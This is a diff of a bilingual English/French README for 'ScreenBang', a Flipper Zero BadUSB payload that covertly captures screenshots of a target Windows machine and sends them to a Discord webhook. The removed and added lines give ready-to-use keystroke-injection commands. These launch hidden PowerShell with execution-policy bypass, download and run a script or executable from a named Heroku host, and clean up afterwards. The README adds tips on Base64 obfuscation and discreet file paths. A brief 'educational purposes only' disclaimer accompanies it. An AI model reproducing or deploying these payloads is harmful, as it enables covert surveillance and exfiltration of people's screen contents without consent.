@@ -1,41 +1,63 @@
-For english poeple, read here. Pour les compatriotes Français, c'est plus bas :p
 # **ScreenBang**
 
-**ScreenBang** is a Flipper Zero payload designed to discreetly capture a screenshot of a target Windows machine and send it directly to a Discord server via a webhook. This tool provides both a Python-based solution and a standalone executable for flexible and seamless use.
+**ScreenBang** is a Flipper Zero payload project designed to discreetly capture screenshots of a target Windows machine and send them directly to a Discord channel via a webhook. This repository provides both customizable and pre-configured payloads to cater to various user needs, making it a turnkey solution for Flipper Zero users.
 
 ---
 
 ## **Features**
+
 - 📸 **Screenshot Capture**: Takes a full-screen screenshot of the target machine.
 - 🚀 **Discord Webhook Integration**: Automatically sends screenshots to a Discord channel.
-- 🧹 **Automatic Cleanup**: Deletes temporary files, including the executable, after execution.
-- 🕵️ **Stealth Mode**: Operates using hidden PowerShell commands to avoid detection.
-- 🔌 **Flipper Zero Integration**: Designed specifically for Flipper Zero's BadUSB functionality.
+- 🧹 **Automatic Cleanup**: Deletes temporary files, including the script, after execution.
+- 🕵️ **Stealth Mode**: Executes commands in hidden PowerShell windows to avoid detection.
+- 🔌 **Flipper Zero Integration**: Optimized for Flipper Zero’s BadUSB functionality with both configurable and pre-configured payloads.
+- 📂 **Customizable File Paths**: Allows users to specify temporary file locations for enhanced discretion.
+- 💡 **User-Friendly Setup**: Minimal configuration required for pre-configured payloads.
 
 ---
 
 ## **Project Structure**
+
 ```
 ScreenBang/
 │
-├── bang.py               # Python script for screenshot capture and Discord webhook
-├── bang.exe              # Compiled standalone executable of bang.py
-├── app.py                # Flask server for hosting the scripts
-├── Screen Bang PY        # Payload for downloading and executing bang.py
-├── Screen Bang EXE       # Payload for downloading and executing bang.exe
-├── LICENSE               # MIT license
-├── README.md             # Project documentation
+├── syshelper.py           # Python script for screenshot capture and Discord webhook
+├── app.py                 # Flask server for hosting the script
+├── screen_bang.txt        # Customizable payload (placeholders for user configuration)
+├── screen_bang_CONFIGURED.txt # Pre-configured payload (ready to use)
+├── LICENSE                # MIT License
+├── README.md              # Project documentation
 ```
 
 ---
 
+## **Payloads Overview**
+
+### **1. screen_bang.txt**
+
+A flexible payload that allows user configuration:
+
+- Replace `<your app url>` with the URL hosting the `syshelper.py` script.
+- Replace `<your webhook here>` with your Discord webhook URL.
+
+### **2. screen_bang_CONFIGURED.txt**
+
+A pre-configured payload for direct use:
+
+- Pre-configured to download the `syshelper.py` script from `https://screenshot-badkb-806c08a412f9.herokuapp.com/`.
+- Replace `<your webhook here>` with your Discord webhook URL.
+
+---
+
 ## **Requirements**
+
 - A **Flipper Zero** device with BadUSB functionality enabled.
 - A **Discord Webhook URL**.
-- A target machine running Windows (7, 10, or 11).
+- A target machine running Windows (7, 10, or 11) with Python installed.
 
-### **Optional: Python-based setup**
-- Python 3.8+ installed on the target machine.
+### **Optional Setup for Developers**
+
+- Flask server for hosting the script (`app.py`).
 - Required Python libraries:
   - `requests`
   - `Pillow`
@@ -44,136 +66,186 @@ ScreenBang/
 
 ## **Installation**
 
-### **1. Modify the Webhook URL**
-To use the Python script, you must replace the placeholder webhook URL with your own.
+### **1. Clone the Repository**
 
-1. Open `bang.py` in any text editor.
-2. Locate the line:
-   ```python
-   WEBHOOK_URL = "<Your discord webhook here>"
-   ```
-3. Replace `<Your discord webhook here>` with your actual Discord webhook URL. For example:
-   ```python
-   WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
-   ```
-4. Save the file.
+```bash
+git clone https://github.com/DuarteAd/ScreenBang.git
+cd ScreenBang
+```
 
----
+### **2. Deploy the Flask Server (Optional)**
 
-### **2. Deploy the Flask Server**
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/DuarteAd/ScreenBang.git
-   cd ScreenBang
-   ```
-2. Install dependencies for the Flask server:
+1. Install dependencies:
    ```bash
    pip install -r requirements.txt
    ```
-3. Deploy the server to a cloud platform (e.g., Heroku):
+2. Deploy to a cloud platform like Heroku:
    ```bash
    heroku create
    git push heroku main
    ```
-4. The server will host `bang.py` and `bang.exe` for payloads to download.
+3. Your server will host `syshelper.py` for payloads to download.
 
 ---
 
-### **3. Prepare Flipper Zero Payloads**
-1. **For the executable**:
-   - Use the `Screen Bang EXE` payload:
+### **3. Prepare the Payloads**
+
+1. **Customizable Payload (`screen_bang.txt`)**:
+
+   - Replace the placeholders in the file with your application URL and Discord webhook.
+   - Example:
      ```plaintext
-     REM Download and execute bang.exe
-     DELAY 1000
-     GUI r
-     DELAY 500
-     STRING powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://<your-heroku-app>.herokuapp.com/bang.exe' -Destination 'C:\Temp\bang.exe'; Start-Process -WindowStyle Hidden -FilePath 'C:\Temp\bang.exe'}"
-     ENTER
+     STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(Invoke-WebRequest -Uri '<your app url>' -OutFile 'C:\\Users\\Public\\syshelper.py')"
      ```
-2. **For the Python script**:
-   - Use the `Screen Bang PY` payload:
+
+2. **Pre-configured Payload (`screen_bang_CONFIGURED.txt`)**:
+
+   - Replace `<your webhook here>` with your Discord webhook URL.
+   - Example:
      ```plaintext
-     REM Download and execute bang.py
-     DELAY 1000
-     GUI r
-     DELAY 500
-     STRING powershell -Command "Invoke-WebRequest -Uri 'https://<your-heroku-app>.herokuapp.com/bang.py' -OutFile 'C:\Temp\bang.py'; python C:\Temp\bang.py"
-     ENTER
+     STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "python 'C:\\Users\\Public\\syshelper.py' '<your webhook here>'"
      ```
+
+3. **Upload to Flipper Zero**:
+   - Copy the `.txt` payload files to the `badusb` folder on your Flipper Zero.
 
 ---
 
 ## **Usage**
-1. Load the payload onto your Flipper Zero.
-2. Connect the Flipper Zero to the target Windows machine.
-3. Execute the payload to capture a screenshot and send it to Discord.
+
+1. Insert the Flipper Zero into the USB port of the target machine.
+2. Select and execute the desired payload from the Flipper Zero BadUSB menu.
+3. Monitor your Discord channel for screenshots sent by the payload.
 
 ---
 
-## **Disclaimer**
-- This project is for **educational purposes only**.
-- Unauthorized use of this tool is **strictly prohibited** and may violate local laws.
-- Ensure you have explicit permission before using this tool on any machine.
+## **Customization Tips**
+
+- **Changing Temporary File Location**:
+
+  - Modify the paths in the payloads to store `syshelper.py` in a more discreet location, such as `C:\Windows\Temp`.
+
+- **Obfuscating Commands**:
+
+  - Encode PowerShell commands in Base64 for added discretion.
+    ```powershell
+    powershell -EncodedCommand <Base64EncodedCommand>
+    ```
+
+- **Testing Locally**:
+
+  - Test each payload in a controlled environment to verify functionality before deploying on the Flipper Zero.
+
+- **Adding Logs**:
+  - Insert logs in `syshelper.py` to debug or monitor operations discreetly.
+
+---
+
+## **Troubleshooting**
+
+- **Python Not Found**:
+
+  - Ensure Python is installed on the target machine and added to the system PATH.
+
+- **Webhook Not Working**:
+
+  - Verify the Discord webhook URL and ensure it is active.
+
+- **File Not Downloaded**:
+  - Check the application URL and ensure the hosting server is running correctly.
+
+---
+
+## **Security and Disclaimer**
+
+This tool is for **educational purposes only**. Unauthorized use of this tool is **strictly prohibited** and may violate local laws. Always obtain explicit permission before using this tool on any machine.
+
+---
+
+## **Contributing**
+
+We welcome contributions to enhance the functionality and usability of ScreenBang. Open an issue or submit a pull request to share your ideas.
 
 ---
 
 ## **Credits**
-This project was developed by **DuarteAd** with the goal of providing a practical and educational example of Flipper Zero's BadUSB capabilities.
 
-### **Special Thanks**
-- The **Flipper Zero Community** for their continuous support and innovation.
-- The developers of **Pillow** and **Requests** for enabling key functionalities in this project.
-- Everyone who contributed feedback and testing to improve ScreenBang.
+- **DuarteAd**: Project creator and maintainer.
+- **Flipper Zero Community**: For their innovation and support.
 
 ---
 
 ## **License**
-This project is licensed under the **MIT License**. You are free to use, modify, and distribute this software, provided you include proper credit to the original author.
+
+This project is licensed under the **MIT License**. You are free to use, modify, and distribute this software with proper credit to the original author.
 
 ---
 
 ## **Support**
-If you encounter any issues or have suggestions for improvement, feel free to open an issue on [GitHub](https://github.com/DuarteAd/ScreenBang).
 
+For issues, questions, or suggestions, feel free to open an issue on [GitHub](https://github.com/DuarteAd/ScreenBang).
 
 # **ScreenBang**
 
-**ScreenBang** est un payload conçu pour le **Flipper Zero**, permettant de capturer discrètement l'écran d'une machine Windows cible et de l'envoyer directement à un serveur Discord via un webhook. Cet outil offre une solution basée sur Python ainsi qu'une version exécutable autonome pour une utilisation flexible.
+**ScreenBang** est un projet de payload pour Flipper Zero conçu pour capturer discrètement des captures d'écran d'une machine Windows cible et les envoyer directement à un canal Discord via un webhook. Ce dépôt propose des payloads personnalisables et préconfigurés pour répondre aux besoins variés des utilisateurs, offrant ainsi une solution clé en main pour les utilisateurs de Flipper Zero.
 
 ---
 
 ## **Fonctionnalités**
-- 📸 **Capture d'écran** : Capture l'écran complet de la machine cible.
+
+- 📸 **Capture d'écran** : Prend une capture complète de l'écran de la machine cible.
 - 🚀 **Intégration Discord** : Envoie automatiquement les captures d'écran à un canal Discord.
-- 🧹 **Nettoyage automatique** : Supprime les fichiers temporaires, y compris l'exécutable, après exécution.
-- 🕵️ **Mode furtif** : Fonctionne à l'aide de commandes PowerShell masquées pour rester discret.
-- 🔌 **Intégration Flipper Zero** : Conçu spécifiquement pour le mode BadUSB du Flipper Zero.
+- 🧹 **Nettoyage automatique** : Supprime les fichiers temporaires, y compris le script, après exécution.
+- 🕵️ **Mode furtif** : Exécute les commandes dans des fenêtres PowerShell cachées pour éviter la détection.
+- 🔌 **Intégration Flipper Zero** : Optimisé pour la fonctionnalité BadUSB du Flipper Zero avec des payloads configurables et préconfigurés.
+- 📂 **Chemins de fichiers personnalisables** : Permet aux utilisateurs de spécifier les emplacements des fichiers temporaires pour une discrétion accrue.
+- 💡 **Configuration intuitive** : Configuration minimale requise pour les payloads préconfigurés.
 
 ---
 
 ## **Structure du projet**
+
 ```
 ScreenBang/
 │
-├── bang.py               # Script Python pour la capture et l'envoi Discord
-├── bang.exe              # Version autonome compilée de bang.py
-├── app.py                # Serveur Flask pour héberger les scripts
-├── Screen Bang PY        # Payload pour télécharger et exécuter bang.py
-├── Screen Bang EXE       # Payload pour télécharger et exécuter bang.exe
-├── LICENSE               # Licence MIT
-├── README.md             # Documentation
+├── syshelper.py           # Script Python pour la capture d'écran et l'envoi Discord
+├── app.py                 # Serveur Flask pour héberger le script
+├── screen_bang.txt        # Payload personnalisable (placeholders pour la configuration utilisateur)
+├── screen_bang_CONFIGURED.txt # Payload préconfiguré (prêt à l'emploi)
+├── LICENSE                # Licence MIT
+├── README.md              # Documentation du projet
 ```
 
 ---
 
-## **Prérequis**
-- Un **Flipper Zero** avec le mode BadUSB activé.
-- Un **webhook Discord** valide.
-- Une machine Windows (7, 10 ou 11).
+## **Payloads disponibles**
 
-### **Optionnel : Configuration Python**
-- Python 3.8+ installé sur la machine cible.
-- Bibliothèques Python nécessaires :
+### **1. screen_bang.txt**
+
+Un payload flexible qui permet une configuration utilisateur :
+
+- Remplacez `<your app url>` par l'URL hébergeant le script `syshelper.py`.
+- Remplacez `<your webhook here>` par l'URL de votre webhook Discord.
+
+### **2. screen_bang_CONFIGURED.txt**
+
+Un payload préconfiguré prêt à l'emploi :
+
+- Préconfiguré pour télécharger le script `syshelper.py` depuis `https://screenshot-badkb-806c08a412f9.herokuapp.com/`.
+- Remplacez `<your webhook here>` par l'URL de votre webhook Discord.
+
+---
+
+## **Prérequis**
+
+- Un **Flipper Zero** avec la fonctionnalité BadUSB activée.
+- Une **URL de webhook Discord**.
+- Une machine cible sous Windows (7, 10 ou 11) avec Python installé.
+
+### **Configuration optionnelle pour les développeurs**
+
+- Serveur Flask pour héberger le script (`app.py`).
+- Bibliothèques Python requises :
   - `requests`
   - `Pillow`
 
@@ -181,94 +253,121 @@ ScreenBang/
 
 ## **Installation**
 
-### **1. Modifier l'URL du Webhook**
-Pour utiliser le script Python, vous devez remplacer l'URL du webhook par la vôtre.
+### **1. Cloner le dépôt**
 
-1. Ouvrez `bang.py` dans un éditeur de texte.
-2. Trouvez la ligne :
-   ```python
-   WEBHOOK_URL = "<Your discord webhook here>"
-   ```
-3. Remplacez `<Your discord webhook here>` par votre URL Discord. Par exemple :
-   ```python
-   WEBHOOK_URL = "https://discord.com/api/webhooks/votre_webhook_id/votre_webhook_token"
-   ```
-4. Sauvegardez le fichier.
+```bash
+git clone https://github.com/DuarteAd/ScreenBang.git
+cd ScreenBang
+```
 
----
+### **2. Déployer le serveur Flask (Optionnel)**
 
-### **2. Déployer le serveur Flask**
-1. Clonez le dépôt :
-   ```bash
-   git clone https://github.com/DuarteAd/ScreenBang.git
-   cd ScreenBang
-   ```
-2. Installez les dépendances pour le serveur Flask :
+1. Installez les dépendances :
    ```bash
    pip install -r requirements.txt
    ```
-3. Déployez le serveur sur une plateforme cloud (par exemple, Heroku) :
+2. Déployez sur une plateforme cloud comme Heroku :
    ```bash
    heroku create
    git push heroku main
    ```
-4. Le serveur hébergera `bang.py` et `bang.exe` pour les payloads.
+3. Votre serveur hébergera `syshelper.py` pour le téléchargement des payloads.
 
 ---
 
-### **3. Préparer les payloads pour le Flipper Zero**
-1. **Pour l'exécutable** :
-   - Utilisez le payload `Screen Bang EXE` :
+### **3. Préparer les payloads**
+
+1. **Payload personnalisable (`screen_bang.txt`)** :
+
+   - Remplacez les placeholders dans le fichier par l'URL de votre application et votre webhook Discord.
+   - Exemple :
      ```plaintext
-     REM Télécharger et exécuter bang.exe
-     DELAY 1000
-     GUI r
-     DELAY 500
-     STRING powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://<votre-app-heroku>.herokuapp.com/bang.exe' -Destination 'C:\Temp\bang.exe'; Start-Process -WindowStyle Hidden -FilePath 'C:\Temp\bang.exe'}"
-     ENTER
+     STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(Invoke-WebRequest -Uri '<your app url>' -OutFile 'C:\\Users\\Public\\syshelper.py')"
      ```
-2. **Pour le script Python** :
-   - Utilisez le payload `Screen Bang PY` :
+
+2. **Payload préconfiguré (`screen_bang_CONFIGURED.txt`)** :
+
+   - Remplacez `<your webhook here>` par l'URL de votre webhook Discord.
+   - Exemple :
      ```plaintext
-     REM Télécharger et exécuter bang.py
-     DELAY 1000
-     GUI r
-     DELAY 500
-     STRING powershell -Command "Invoke-WebRequest -Uri 'https://<votre-app-heroku>.herokuapp.com/bang.py' -OutFile 'C:\Temp\bang.py'; python C:\Temp\bang.py"
-     ENTER
+     STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "python 'C:\\Users\\Public\\syshelper.py' '<your webhook here>'"
      ```
+
+3. **Charger sur le Flipper Zero** :
+   - Copiez les fichiers `.txt` dans le dossier `badusb` de votre Flipper Zero.
 
 ---
 
 ## **Utilisation**
-1. Chargez le payload sur votre Flipper Zero.
-2. Connectez le Flipper Zero à la machine Windows cible.
-3. Exécutez le payload pour capturer l'écran et l'envoyer sur Discord.
+
+1. Insérez le Flipper Zero dans le port USB de la machine cible.
+2. Sélectionnez et exécutez le payload souhaité depuis le menu BadUSB du Flipper Zero.
+3. Surveillez votre canal Discord pour les captures d'écran envoyées par le payload.
 
 ---
 
-## **Avertissement**
-- Ce projet est destiné **uniquement à des fins éducatives**.
-- Toute utilisation non autorisée est **strictement interdite** et peut enfreindre les lois locales.
-- Assurez-vous d'avoir une autorisation explicite avant d'utiliser cet outil.
+## **Conseils de personnalisation**
+
+- **Changer l'emplacement des fichiers temporaires** :
+
+  - Modifiez les chemins dans les payloads pour stocker `syshelper.py` dans un emplacement plus discret, tel que `C:\Windows\Temp`.
+
+- **Obfuscation des commandes** :
+
+  - Encodez les commandes PowerShell en Base64 pour plus de discrétion.
+    ```powershell
+    powershell -EncodedCommand <Base64EncodedCommand>
+    ```
+
+- **Tests locaux** :
+
+  - Testez chaque payload dans un environnement contrôlé pour vérifier son bon fonctionnement avant de le déployer sur le Flipper Zero.
+
+- **Ajout de journaux** :
+  - Insérez des logs dans `syshelper.py` pour déboguer ou surveiller les opérations discrètement.
+
+---
+
+## **Dépannage**
+
+- **Python introuvable** :
+
+  - Assurez-vous que Python est installé sur la machine cible et ajouté au PATH du système.
+
+- **Webhook non fonctionnel** :
+
+  - Vérifiez l'URL du webhook Discord et assurez-vous qu'il est actif.
+
+- **Fichier non téléchargé** :
+  - Vérifiez l'URL de l'application et assurez-vous que le serveur d'hébergement fonctionne correctement.
+
+---
+
+## **Sécurité et avertissement**
+
+Cet outil est destiné **uniquement à des fins éducatives**. Toute utilisation non autorisée de cet outil est **strictement interdite** et peut enfreindre les lois locales. Obtenez toujours une autorisation explicite avant d'utiliser cet outil sur une machine.
+
+---
+
+## **Contributions**
+
+Nous accueillons les contributions pour améliorer la fonctionnalité et l'utilisabilité de ScreenBang. Ouvrez une issue ou soumettez une pull request pour partager vos idées.
 
 ---
 
 ## **Crédits**
-Ce projet a été développé par **DuarteAd** dans le but de fournir un exemple pratique et éducatif des capacités BadUSB du Flipper Zero.
 
-### **Remerciements spéciaux**
-- La communauté **Flipper Zero** pour leur soutien et leurs innovations.
-- Les développeurs de **Pillow** et **Requests** pour les bibliothèques essentielles utilisées.
-- Tous ceux qui ont contribué par leurs retours et tests pour améliorer ScreenBang.
+- **DuarteAd** : Créateur et mainteneur du projet.
+- **Communauté Flipper Zero** : Pour leur innovation et leur soutien.
 
 ---
 
 ## **Licence**
-Ce projet est sous licence **MIT**. Vous êtes libre de l'utiliser, le modifier et le distribuer, à condition de créditer l'auteur original.
+
+Ce projet est sous licence **MIT**. Vous êtes libre de l'utiliser, de le modifier et de le distribuer avec un crédit approprié à l'auteur original.
 
 ---
 
 ## **Support**
-Si vous rencontrez des problèmes ou avez des suggestions d'amélioration, ouvrez une issue sur [GitHub](https://github.com/DuarteAd/ScreenBang).
 
+Pour tout problème, question ou suggestion, n'hésitez pas à ouvrir une issue sur [GitHub](https://github.com/DuarteAd/ScreenBang).
